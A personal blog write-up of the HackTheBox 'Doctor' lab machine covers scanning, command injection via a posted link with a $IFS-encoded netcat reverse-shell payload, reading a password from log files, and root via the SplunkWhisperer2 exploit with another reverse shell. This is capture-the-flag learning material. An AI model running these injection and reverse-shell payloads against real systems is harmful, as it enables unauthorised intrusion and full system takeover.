---
title: Hackthebox Doctor Writeup
image: /images/doctor/info.png
tags:
- hackthebox
- writeup
---

Ohisashi buri desu ne? (No, I am not japanese I am just a weeb) Well hello there! It has been about 2 weeks and I have written absolutely nothing. But give me a break I was ill and then I had my exams. I solved this box before all this mess started so forgive if I miss something important. So this box was your run of the mill easy box with a hard foothold. But I was happy because the foothold really felt something we can encounter in real world. Priv esc was easy google fu. Lets see if I still got it!

<!--more-->

<img src="/images/doctor/info.png" />

The Nmap show something different this time.

{%highlight text%}
nmap -Pn -T4 10.10.10.209

Starting Nmap 7.60 ( https://nmap.org ) at 2020-10-02 21:38 IST
Nmap scan report for 10.10.10.209
Host is up (0.21s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8089/tcp open  unknown
{%endhighlight%}

Lets do another scan for further details on port 8089.

{%highlight text%}
nmap -A -p8089 -T4 10.10.10.209

PORT     STATE SERVICE  VERSION
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
{%endhighlight%}

Hmmm... Never seen a splunk service before. Looks interesting but lets first enumerate the web server. Browsing to web page.

<img src="/images/doctor/website.png" width="1000" />

Looking around I don't find anything interesting. Lets add an entry in the /etc/hosts file.

`10.10.10.209  doctors.htb`

Now browsing to doctors.htb we see a a login page.

<img src="/images/doctor/login.png" width="1000" >

After spending not too much time on trying basic Injections and default creds I go ahead and create a new account. After logging in we see an empty space.

<img src="/images/doctor/empty.png" width="1000" />

I see a "New Message" functionality. We can write messages and they will appear on the empty space. First thing that comes to mind is XSS. Maybe we need to steal some cookies with stored XSS but after some trying I see that there is input sanitisation. 

After some hints from sources I trust (HTB forums) I tried to enter a link. Nothing happened. After that I start my own python server and then enter it's link to check for any activity. After posting a link I can see a GET request to the server.

<img src="/images/doctor/ping.png" width="1000">

{%highlight text%}
python3 -m http.server 15000
Serving HTTP on 0.0.0.0 port 15000 (http://0.0.0.0:15000/) ...
10.10.10.209 - - [18/Oct/2020 09:55:54] "GET / HTTP/1.1" 200 -
{%endhighlight%}

Next I think what if it uses something like curl to make the requests? Then I might be able to injection some code. So I try some chaining techniques and one finally worked.

{%highlight text%}
http://10.10.12.22:15000/$(whoami)

10.10.10.209 - - [18/Oct/2020 09:57:32] "GET /web HTTP/1.1" 404 -
{%endhighlight%}

YESS! We can see the user "web" with the web request. Next I try to use this to method to maybe get a netcat connection. But when I use spaces between my command and post the message I get an error saying that the URL is invalid. That makes sense because you dont see spaces in a URL. I had to find a way to bypass that.

After some searching I see that you can use "$IFS" wherever you want a space in a command. IFS is a variable that is used for field separation. But even after properly constructing my payload I still was not getting a connection. Two possibilities are that netcat was not installed OR the version of netcat did not support the "-e" flag. I search and find that you can use "nc.tradtional" to use the old version of netcat. 

This was the final payload which worked.

{%highlight text%}
http://10.10.12.22:15000/$(nc.traditional$IFS'10.10.12.22'$IFS'1234'$IFS-e$IFS'/bin/bash')
{%endhighlight%}

And I get a netcat connection after posting the message. The hard part is now over.

{%highlight text%}
nc -lvp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from doctors.htb 58944 received!
whoami
web
python3 -c 'import pty;pty.spawn("/bin/bash")'       
web@doctor:~$ 
web@doctor:~$ id
id
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
{%endhighlight%}

We already have a clue for what to do next. We see with the "id" command that we are in the "adm" group. This means that we have the permissions to read the log files. I hop on over to the `/var/log` directory and started grepping for things like password,user, shaun(another user on system) etc.

After some grepping I find possible password for user shaun.

{%highlight text%}
grep -r password

apache2/error.log:[Sun Oct 18 03:43:47.383350 2020] [php7:error] [pid 641915] [client 10.10.14.206:34630] script '/var/www/html/resetpassword.php' not found or unable to stat
apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
apache2/error.log.1:[Sat Oct 17 12:38:31.996156 2020] [php7:error] [pid 4366] [client 10.10.14.35:41188] script '/var/www/html/reset.php' not found or unable to stat

{%endhighlight%}

We see a password reset request with the what looks like a possible password to me. So I try to change to user shaun using "Guitar123" and we are successful. We get the user flag. Next up is root. Lets finally try the Splunk port.

<img src="/images/doctor/splunk.png" width="1000">

When I click on the links it asked for creds and we can login using the the creds "shaun:Guitar123". But Even After logging in I can hardly make sense of anything as I have never worked on splunk before. But I did find an [Authenticated RCE exploit](https://github.com/cnotin/SplunkWhisperer2) for splunk.

Reading the exploit I understand that the script first authenticates using the creds and then creates a malicious splunk app which when run gives us the reverse shell. 

Using the script we get a shell as root.

{%highlight text%}
python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.12.22 --username shaun --password Guitar123  --payload 'nc.traditional 10.10.12.22 1234 -e /bin/bash'

Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmp_4uihact.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.12.22:8181/
10.10.10.209 - - [05/Oct/2020 15:37:46] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

Press RETURN to cleanup
{%endhighlight%}

After running we get a netcat connection with shell as root user.
{%highlight text%}
nc -lvp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from doctors.htb 36368 received!
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
{%endhighlight%}

Learnt a lot during the foothold. Rest user and root were easy for me. Now if you would excuse me I have fallen pretty far behind my plan and I need to make up for it. See ya! 